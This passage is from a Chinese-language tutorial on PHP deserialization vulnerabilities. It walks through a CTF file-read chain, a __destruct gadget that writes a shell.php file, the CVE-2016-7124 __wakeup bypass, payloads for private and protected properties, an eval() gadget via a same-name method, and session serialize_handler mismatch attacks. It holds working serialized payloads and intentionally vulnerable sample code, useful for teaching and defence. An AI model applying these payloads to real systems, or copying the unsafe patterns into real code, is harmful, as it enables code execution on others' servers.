+index.php`里面要求`$file`参数不能包含`flag`字段，所以文件不能包含`flag.php`，所以`$file=hint.php`，把`hint.php`包含进去，里面存在一个`file_get_concents函数`可以读文件，想到`index.php`里面的`unserialize`函数，所以只需要控制`$this-&amp;gt;file`就能读取想要的文件
+用这段代码的结果传值给`$password
+&amp;lt;?php
+    class Flag{
+        public $file=&#39;flag.php&#39;;
+    }
+    $a=new Flag();
+    $b=serialize($a);
+    echo $b;
+?&amp;gt;
+$password`进行反序列化后`$file`就被赋值为`flag.php`，然后`file_get_contents`就得到了`flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144423-dd119f00-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144423-dd119f00-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;再来一个反序列化漏洞利用例子，代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class foo{
+        public $file = &amp;quot;2.txt&amp;quot;;
+        public $data = &amp;quot;test&amp;quot;;
+        function __destruct(){
+            file_put_contents(dirname(__FILE__).&#39;/&#39;.$this-&amp;gt;file,$this-&amp;gt;data);
+        }
+    }
+    $file_name = $_GET[&#39;filename&#39;];
+    print &amp;quot;You have readfile &amp;quot;.$file_name;
+    unserialize(file_get_contents($file_name));
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这串代码的意思是将读取的文件内容进行反序列化，&lt;code&gt;__destruct&lt;/code&gt;函数里面是生成文件，如果我们本地存在一个文件名是&lt;code&gt;flag.txt&lt;/code&gt;，里面的内容是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;O:3:&amp;quot;foo&amp;quot;:2:{s:4:&amp;quot;file&amp;quot;;s:9:&amp;quot;shell.php&amp;quot;;s:4:&amp;quot;data&amp;quot;;s:18:&amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将它进行反序列化就会生成&lt;code&gt;shell.php&lt;/code&gt;里面的内容为&lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144432-e1ef4f90-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144432-e1ef4f90-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144444-e95a626a-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144444-e95a626a-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;cve-2016-7124-__wakeup绕过&#34;&gt;CVE-2016-7124 __wakeup绕过&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;__wakeup魔法函数简介&lt;/strong&gt;&lt;br&gt;
+&lt;code&gt;unserialize()&lt;/code&gt;会检查是否存在一个 &lt;code&gt;__wakeup()&lt;/code&gt; 方法。如果存在，则会先调用 &lt;code&gt;__wakeup()&lt;/code&gt; 方法，预先准备对象需要的资源&lt;br&gt;
+反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过&lt;code&gt;__wakeup()&lt;/code&gt;的执行&lt;br&gt;
+&lt;strong&gt;漏洞影响版本：&lt;/strong&gt;&lt;br&gt;
+php5 &amp;lt; 5.6.25&lt;br&gt;
+php7 &amp;lt; 7.0.10&lt;br&gt;
+&lt;strong&gt;漏洞复现：&lt;/strong&gt;&lt;br&gt;
+代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class A{
+        public $target = &amp;quot;test&amp;quot;;
+        function __wakeup(){
+            $this-&amp;gt;target = &amp;quot;wakeup!&amp;quot;;
+        }
+        function __destruct(){
+            $fp = fopen(&amp;quot;D:\Program Files\PHPTutorial\WWW\zx\hello.php&amp;quot;,&amp;quot;w&amp;quot;);
+            fputs($fp,$this-&amp;gt;target);
+            fclose($fp);
+        }
+    }
+    $a = $_GET[&#39;test&#39;];
+    $b = unserialize($a);
+    echo &amp;quot;hello.php&amp;quot;.&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
+    include(&amp;quot;./hello.php&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;魔法函数&lt;code&gt;__wakeup()&lt;/code&gt;要比&lt;code&gt;__destruct()&lt;/code&gt;先执行，所以我们之间传入&lt;br&gt;
+&lt;code&gt;O:1:&amp;quot;A&amp;quot;:1:{s:6:&amp;quot;target&amp;quot;;s:18:&amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;;}&lt;/code&gt;&lt;br&gt;
+时会被先执行的&lt;code&gt;__wakeup()&lt;/code&gt;函数&lt;code&gt;$target&lt;/code&gt;赋值覆盖为&lt;code&gt;wakeup!&lt;/code&gt;，然后生成的&lt;code&gt;hello.php&lt;/code&gt;里面的内容就是&lt;code&gt;wakeup!&lt;/code&gt;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144453-eebf630e-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144453-eebf630e-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;现在我们根据绕过方法：对象属性个数的值大于真实的属性个数时就会跳过&lt;code&gt;__wakeup()&lt;/code&gt;的执行，对象个数原来是1我们将其改为2，也就是&lt;br&gt;
+&lt;code&gt;O:2:&amp;quot;A&amp;quot;:1:{s:6:&amp;quot;target&amp;quot;;s:18:&amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;;}&lt;/code&gt;&lt;br&gt;
+就能实现绕过&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144459-f23fd856-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144459-f23fd856-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;注入对象构造方法&#34;&gt;注入对象构造方法&lt;/h1&gt;
+&lt;h2 id=&#34;当目标对象被private-protected修饰时反序列化漏洞的利用&#34;&gt;当目标对象被private、protected修饰时反序列化漏洞的利用&lt;/h2&gt;
+&lt;p&gt;上面说了&lt;code&gt;private&lt;/code&gt;和&lt;code&gt;protected&lt;/code&gt;返回长度和&lt;code&gt;public&lt;/code&gt;不一样的原因，这里再写一下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;private属性序列化的时候格式是%00类名%00成员名
+protect属性序列化的时候格式是%00*%00成员名
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;protected&lt;/code&gt;情况下，代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class A{
+        protected $test = &amp;quot;hahaha&amp;quot;;
+        function __destruct(){
+            echo $this-&amp;gt;test;
+        }
+    }
+    $a = $_GET[&#39;test&#39;];
+    $b = unserialize($a);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;利用方式：&lt;br&gt;
+先用如下代码输出利用的序列化串&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class A{
+        protected $test = &amp;quot;hacked by ghtwf01&amp;quot;;
+    }
+    $a = new A();
+    $b = serialize($a);
+    print_r($b);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到&lt;code&gt;O:1:&amp;quot;A&amp;quot;:1:{s:7:&amp;quot;*test&amp;quot;;s:17:&amp;quot;hacked by ghtwf01&amp;quot;;}&lt;/code&gt;&lt;br&gt;
+因为&lt;code&gt;protected&lt;/code&gt;是&lt;code&gt;*&lt;/code&gt;号两边都有&lt;code&gt;%00&lt;/code&gt;，所以必须在&lt;code&gt;url&lt;/code&gt;上面也加上，否则不会利用成功&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144507-f7487f88-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144507-f7487f88-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;code&gt;private&lt;/code&gt;情况下，代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class A{
+        private $test = &amp;quot;hacked by ghtwf01&amp;quot;;
+    }
+    $a = new A();
+    $b = serialize($a);
+    print_r($b);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;利用代码这里省略吧，同上面，得到序列化后的字符串为&lt;code&gt;O:1:&amp;quot;A&amp;quot;:1:{s:7:&amp;quot;Atest&amp;quot;;s:17:&amp;quot;hacked by ghtwf01&amp;quot;;&lt;/code&gt;&lt;br&gt;
+因为&lt;code&gt;private&lt;/code&gt;是类名&lt;code&gt;A&lt;/code&gt;两边都有&lt;code&gt;%00&lt;/code&gt;所以同样在&lt;code&gt;url&lt;/code&gt;上面体现&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144513-fa534faa-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144513-fa534faa-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;同名方法的利用&#34;&gt;同名方法的利用&lt;/h2&gt;
+&lt;p&gt;代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class A{
+        public $target;
+        function __construct(){
+            $this-&amp;gt;target = new B;
+        }
+        function __destruct(){
+            $this-&amp;gt;target-&amp;gt;action();
+        }
+    }
+    class B{
+        function action(){
+            echo &amp;quot;action B&amp;quot;;
+        }
+    }
+    class C{
+        public $test;
+        function action(){
+            echo &amp;quot;action A&amp;quot;;
+            eval($this-&amp;gt;test);
+        }
+    }
+    unserialize($_GET[&#39;test&#39;]);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个例子中，&lt;code&gt;class B&lt;/code&gt;和&lt;code&gt;class C&lt;/code&gt;有一个同名方法&lt;code&gt;action&lt;/code&gt;，我们可以构造目标对象，使得析构函数调用&lt;code&gt;class C&lt;/code&gt;的&lt;code&gt;action&lt;/code&gt;方法，实现任意代码执行&lt;br&gt;
+利用代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class A{
+        public $target;
+        function __construct(){
+            $this-&amp;gt;target = new C;
+            $this-&amp;gt;target-&amp;gt;test = &amp;quot;phpinfo();&amp;quot;;
+        }
+        function __destruct(){
+            $this-&amp;gt;target-&amp;gt;action();
+        }
+    }
+    class C{
+        public $test;
+        function action(){
+            echo &amp;quot;action C&amp;quot;;
+            eval($this-&amp;gt;test);
+        }
+    }
+    echo serialize(new A);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144521-ff4ec48a-0517-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144521-ff4ec48a-0517-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;session反序列化漏洞&#34;&gt;session反序列化漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;什么是session&#34;&gt;什么是session&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;session&lt;/code&gt;英文翻译为&amp;quot;会话&amp;quot;，两个人聊天从开始到结束就构成了一个会话。&lt;code&gt;PHP&lt;/code&gt;里的&lt;code&gt;session&lt;/code&gt;主要是指客户端浏览器与服务端数据交换的对话，从浏览器打开到关闭，一个最简单的会话周期&lt;/p&gt;
+&lt;h2 id=&#34;php-session工作流程&#34;&gt;PHP session工作流程&lt;/h2&gt;
+&lt;p&gt;会话的工作流程很简单，当开始一个会话时，&lt;code&gt;PHP&lt;/code&gt;会尝试从请求中查找会话 &lt;code&gt;ID&lt;/code&gt; （通常通过会话 &lt;code&gt;cookie&lt;/code&gt;），如果发现请求的&lt;code&gt;Cookie&lt;/code&gt;、&lt;code&gt;Get&lt;/code&gt;、&lt;code&gt;Post&lt;/code&gt;中不存在&lt;code&gt;session id&lt;/code&gt;，&lt;code&gt;PHP&lt;/code&gt; 就会自动调用&lt;code&gt;php_session_create_id&lt;/code&gt;函数创建一个新的会话，并且在&lt;code&gt;http response&lt;/code&gt;中通过&lt;code&gt;set-cookie&lt;/code&gt;头部发送给客户端保存，例如登录如下网页&lt;code&gt;Cokkie、Get、Post&lt;/code&gt;都不存在&lt;code&gt;session id&lt;/code&gt;，于是就使用了&lt;code&gt;set-cookie&lt;/code&gt;头&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;有时候浏览器用户设置会禁止 &lt;code&gt;cookie&lt;/code&gt;，当在客户端&lt;code&gt;cookie&lt;/code&gt;被禁用的情况下，&lt;code&gt;php&lt;/code&gt;也可以自动将&lt;code&gt;session id&lt;/code&gt;添加到&lt;code&gt;url&lt;/code&gt;参数中以及&lt;code&gt;form&lt;/code&gt;的&lt;code&gt;hidden&lt;/code&gt;字段中，但这需要将&lt;code&gt;php.ini&lt;/code&gt;中的&lt;code&gt;session.use_trans_sid&lt;/code&gt;设为开启，也可以在运行时调用&lt;code&gt;ini_set&lt;/code&gt;来设置这个配置项&lt;/p&gt;
+&lt;p&gt;会话开始之后，&lt;code&gt;PHP&lt;/code&gt; 就会将会话中的数据设置到 &lt;code&gt;$_SESSION&lt;/code&gt; 变量中，如下述代码就是一个在 &lt;code&gt;$_SESSION&lt;/code&gt; 变量中注册变量的例子：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+session_start();
+if (!isset($_SESSION[&#39;username&#39;])) {
+  $_SESSION[&#39;username&#39;] = &#39;ghtwf01&#39; ;
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;代码的意思就是如果不存在&lt;code&gt;session&lt;/code&gt;那么就创建一个&lt;code&gt;session&lt;/code&gt;&lt;br&gt;
+也可以用如下流程图表示&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;18&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144840-76164138-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144840-76164138-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;phpini配置&#34;&gt;php.ini配置&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;php.ini&lt;/code&gt;里面有如下六个相对重要的配置&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;session.save_path=&amp;quot;&amp;quot;      --设置session的存储位置
+session.save_handler=&amp;quot;&amp;quot;   --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数
+session.auto_start        --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动
+session.serialize_handler --定义用来序列化/反序列化的处理器名字，默认使用php  
+session.upload_progress.enabled --启用上传进度跟踪，并填充$ _SESSION变量，默认启用
+session.upload_progress.cleanup --读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如&lt;code&gt;phpstudy&lt;/code&gt;下上述配置如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;session.save_path = &amp;quot;/tmp&amp;quot;      --所有session文件存储在/tmp目录下
+session.save_handler = files    --表明session是以文件的方式来进行存储的
+session.auto_start = 0          --表明默认不启动session
+session.serialize_handler = php --表明session的默认(反)序列化引擎使用的是php(反)序列化引擎
+session.upload_progress.enabled on --表明允许上传进度跟踪，并填充$ _SESSION变量
+session.upload_progress.cleanup on --表明所有POST数据（即完成上传）后，立即清理进度信息($ _SESSION变量)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;php-session-的存储机制&#34;&gt;PHP session 的存储机制&lt;/h2&gt;
+&lt;p&gt;上文中提到了 &lt;code&gt;PHP session&lt;/code&gt;的存储机制是由&lt;code&gt;session.serialize_handler&lt;/code&gt;来定义引擎的，默认是以文件的方式存储，且存储的文件是由&lt;code&gt;sess_sessionid&lt;/code&gt;来决定文件名的，当然这个文件名也不是不变的，都是&lt;code&gt;sess_sessionid&lt;/code&gt;形式&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;19&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144846-79d7b220-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144846-79d7b220-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;打开看一下全是序列化后的内容&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;20&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144851-7c6e2e6a-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144851-7c6e2e6a-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;现在我们来看看&lt;code&gt;session.serialize_handler&lt;/code&gt;，它定义的引擎有三种&lt;/p&gt;
+&lt;p&gt;| 处理器名称 | 存储格式 |&lt;br&gt;
+| php | 键名 + 竖线 + 经过serialize()函数序列化处理的值 |&lt;br&gt;
+| php_binary | 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值|&lt;br&gt;
+| php_serialize(php&amp;gt;5.5.4) | 经过serialize()函数序列化处理的数组 |&lt;/p&gt;
+&lt;h3 id=&#34;php处理器&#34;&gt;php处理器&lt;/h3&gt;
+&lt;p&gt;首先来看看&lt;code&gt;session.serialize_handler&lt;/code&gt;等于&lt;code&gt;php&lt;/code&gt;时候的序列化结果，代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
+session_start();
+$_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
+?&amp;gt;
+session`的`sessionid`其实可以看到的，为`i38age8ok4bofpiuiku3h20fh0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;21&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144859-81378040-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144859-81378040-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;于是我们到&lt;code&gt;session&lt;/code&gt;存储目录查看一下&lt;code&gt;session&lt;/code&gt;文件内容&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;22&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144905-85162680-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144905-85162680-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;code&gt;session&lt;/code&gt;为&lt;code&gt;$_SESSION[&#39;session&#39;]&lt;/code&gt;的键名，&lt;code&gt;|&lt;/code&gt;后为传入&lt;code&gt;GET&lt;/code&gt;参数经过序列化后的值&lt;/p&gt;
+&lt;h3 id=&#34;php_binary处理器&#34;&gt;php_binary处理器&lt;/h3&gt;
+&lt;p&gt;再来看看&lt;code&gt;session.serialize_handler&lt;/code&gt;等于&lt;code&gt;php_binary&lt;/code&gt;时候的序列化结果&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+ini_set(&#39;session.serialize_handler&#39;,&#39;php_binary&#39;);
+session_start();
+$_SESSION[&#39;sessionsessionsessionsessionsession&#39;] = $_GET[&#39;session&#39;];
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;为了更能直观的体现出格式的差别，因此这里设置了键值长度为 &lt;code&gt;35&lt;/code&gt;，&lt;code&gt;35&lt;/code&gt; 对应的 &lt;code&gt;ASCII&lt;/code&gt; 码为&lt;code&gt;#&lt;/code&gt;，所以最终的结果如下&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;23&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144911-888b7d60-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144911-888b7d60-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;code&gt;#&lt;/code&gt;为键名长度对应的 &lt;code&gt;ASCII&lt;/code&gt; 的值，&lt;code&gt;sessionsessionsessionsessionsessions&lt;/code&gt;为键名，&lt;code&gt;s:7:&amp;quot;xianzhi&amp;quot;;&lt;/code&gt;为传入 &lt;code&gt;GET&lt;/code&gt; 参数经过序列化后的值&lt;/p&gt;
+&lt;h3 id=&#34;php_serialize-处理器&#34;&gt;php_serialize 处理器&lt;/h3&gt;
+&lt;p&gt;最后就是&lt;code&gt;session.serialize_handler&lt;/code&gt;等于&lt;code&gt;php_serialize&lt;/code&gt;时候的序列化结果，代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
+session_start();
+$_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;结果如下&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;24&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144917-8c3357da-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144917-8c3357da-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;code&gt;a:1&lt;/code&gt;表示&lt;code&gt;$_SESSION&lt;/code&gt;数组中有 &lt;code&gt;1&lt;/code&gt; 个元素，花括号里面的内容即为传入&lt;code&gt;GET&lt;/code&gt;参数经过序列化后的值&lt;/p&gt;
+&lt;h2 id=&#34;session的反序列化漏洞利用&#34;&gt;session的反序列化漏洞利用&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;php&lt;/code&gt;处理器和&lt;code&gt;php_serialize&lt;/code&gt;处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。形成的原理就是在用&lt;code&gt;session.serialize_handler = php_serialize&lt;/code&gt;存储的字符可以引入 &lt;code&gt;|&lt;/code&gt; , 再用&lt;code&gt;session.serialize_handler = php&lt;/code&gt;格式取出&lt;code&gt;$_SESSION&lt;/code&gt;的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。&lt;br&gt;
+我们创建一个&lt;code&gt;session.php&lt;/code&gt;，用于传输&lt;code&gt;session&lt;/code&gt;值，里面代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
+session_start();
+$_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;再创建一个&lt;code&gt;hello.php&lt;/code&gt;，里面代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    error_reporting(0);
+  ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
+  session_start();
+    class D0g3{
+    public $name = &#39;panda&#39;;
+    function __wakeup(){
+      echo &amp;quot;Who are you?&amp;quot;;
+    }
+    function __destruct(){
+      echo &#39;&amp;lt;br&amp;gt;&#39;.$this-&amp;gt;name;
+    }
+  }
+  $str = new XianZhi();
+ ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这两个文件的作用很清晰，&lt;code&gt;session.php&lt;/code&gt;文件的处理器是&lt;code&gt;php_serialize&lt;/code&gt;，&lt;code&gt;hello.php&lt;/code&gt;文件的处理器是&lt;code&gt;php&lt;/code&gt;，&lt;code&gt;session.php&lt;/code&gt;文件的作用是传入可控的 &lt;code&gt;session&lt;/code&gt;值，&lt;code&gt;hello.php&lt;/code&gt;文件的作用是在反序列化开始前输出&lt;code&gt;Who are you?&lt;/code&gt;，反序列化结束的时候输出&lt;code&gt;name&lt;/code&gt;值&lt;br&gt;
+运行一下&lt;code&gt;hello.php&lt;/code&gt;看一下效果&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;25&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144925-90e78454-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144925-90e78454-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;我们用如下代码来复现一下&lt;code&gt;session&lt;/code&gt;的反序列化漏洞&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class D0g3{
+    public $name = &#39;ghtwf01&#39;;
+    function __wakeup(){
+      echo &amp;quot;Who are you?&amp;quot;;
+    }
+    function __destruct(){
+      echo &#39;&amp;lt;br&amp;gt;&#39;.$this-&amp;gt;name;
+    }
+  }
+  $str = new D0g3();
+  echo serialize($str);
+ ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出结果为&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;26&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144932-94f8e8a8-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144932-94f8e8a8-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;因为&lt;code&gt;session&lt;/code&gt;是&lt;code&gt;php_serialize&lt;/code&gt;处理器，所以允许&lt;code&gt;|&lt;/code&gt;存在字符串中，所以将这段代码序列化内容前面加上&lt;code&gt;|&lt;/code&gt;传入&lt;code&gt;session.php&lt;/code&gt;中&lt;br&gt;
+现在来看一下存入&lt;code&gt;session&lt;/code&gt;文件的内容&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;27&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144936-97555262-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144936-97555262-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;再打开&lt;code&gt;hello.php&lt;/code&gt;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;28&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144941-9a2ff17c-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144941-9a2ff17c-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
